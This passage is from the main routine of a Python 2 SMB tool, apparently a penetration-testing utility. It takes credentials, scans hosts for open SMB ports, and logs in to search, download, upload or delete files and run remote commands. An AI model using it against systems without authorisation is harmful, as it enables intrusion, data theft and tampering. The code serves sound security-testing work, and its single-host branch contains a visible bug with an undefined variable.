    if '-p' not in sys.argv:
        passwd = raw_input('%s\'s Password: ' % (user))    
 
    if len(set(sys.argv).intersection(['-d'])) == 0: 
        print '[!] Missing domain...defaulting to WORKGROUP'
        domain = 'WORKGROUP'
    
    if mysmb.valid_ip(ipArg):
        ip = ipArg
    elif not sys.stdin.isatty():
        isFile = True
        print '[+] Reading from stdin'
        ip = sys.stdin.readlines()
    else:
        print '[!] Host not defined'
        sys.exit()
   
    if not port:
        port = 445
    if '-v' in sys.argv:
        port = 139

    print '[+] Finding open SMB ports....'
    socket.setdefaulttimeout(2)
    if isFile:
        for i in ip:
            try:
                if mysmb.find_open_ports(i.strip(), int(port)):
                    try:
                        host[i.strip()] = { 'name' : socket.getnameinfo(i.strip(), port) , 'port' : port, 'user' : user, 'passwd' : passwd, 'domain' : domain}
                    except:
                        host[i.strip()] = { 'name' : 'unkown', 'port' : 445, 'user' : user, 'passwd' : passwd, 'domain' : domain }
            except Exception as e:
                print '[!]', e
                continue
    else:
        if mysmb.find_open_ports(ip, int(port)):
            if port:
                try:
                    #host[ip.strip()] = { 'name' : socket.gethostbyaddr(ip)[0], 'port' : port }
                    host[ip.strip()] = { 'name' : socket.getnameinfo(i.strip(), port), 'port' : port, 'user' : user, 'passwd' : passwd, 'domain' : domain}
                except:
                    host[ip.strip()] = { 'name' : 'unkown', 'port' : 445, 'user' : user, 'passwd' : passwd, 'domain' : domain } 
    
    mysmb.hosts = host
    mysmb.smart_login()
    for host in mysmb.hosts.keys():
        if file_search:
            print '[+] File search started on %d hosts...this could take a while' % (len(mysmb.hosts))
            if not search_path:
                search_path = 'C:\Users'
            if search_path[-1] == '\\':
                search_path = search_path[:-1] 
            mysmb.start_file_search(host, pattern, share, search_path)
        if '-v' in sys.argv:
            mysmb.get_version(host)
        
        if list_shares: 
            print '\tDisk%s\tPermissions' % (' '.ljust(50))
            print '\t----%s\t-----------' % (' '.ljust(50))

        try:
            if dlPath:
                mysmb.download_file(host, dlPath)
                sys.exit()

            if src and dst:
                mysmb.upload_file(host, src, dst)
                sys.exit()

            if delFile:
                mysmb.delete_file(host, delFile)
                sys.exit()
            
            if command:
                mysmb.exec_command(host, share, command, True)
                sys.exit()
    
            if list_drives:
                mysmb.list_drives(host, share)

            if list_shares:
                mysmb.output_shares(host, lsshare, lspath, True)

        except SessionError as e:
            print '[!] Access Denied'
        except Exception as e:
            print '[!]', e
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            print(exc_type, fname, exc_tb.tb_lineno)
            sys.stdout.flush()
    if file_search:
        mysmb.get_search_results()
     
    for host in mysmb.hosts.keys():
        mysmb.logout(host) 
